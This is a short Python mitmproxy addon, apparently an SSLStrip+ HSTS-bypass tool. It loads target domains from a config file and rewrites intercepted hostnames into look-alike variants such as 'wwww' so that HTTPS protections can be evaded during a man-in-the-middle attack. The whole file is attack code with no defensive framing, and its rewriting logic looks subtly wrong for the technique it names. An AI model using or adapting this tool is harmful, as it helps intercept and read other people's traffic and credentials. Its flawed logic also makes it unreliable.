from mitmproxy import http

class SSLStripPlus:
    def __init__(self, custom_domains):
        self.custom_domains = custom_domains

    def request(self, flow: http.HTTPFlow) -> None:
        host = flow.request.pretty_host
        for domain in self.custom_domains:
            if domain in host:
                if host.startswith('www.'):
                    new_host = 'w' + host
                else:
                    parts = host.split('.')
                    parts[0] = 'w' + parts[0]
                    new_host = '.'.join(parts)
                flow.request.host = new_host
                break

def start():
    custom_domains = parse_hsts_bypass_config('hsts_bypass.cfg')
    sslstrip_plus = SSLStripPlus(custom_domains)
    return sslstrip_plus

def parse_hsts_bypass_config(filename):
    with open(filename, 'r') as file:
        custom_domains = [line.strip() for line in file if line.strip()]
    return custom_domains
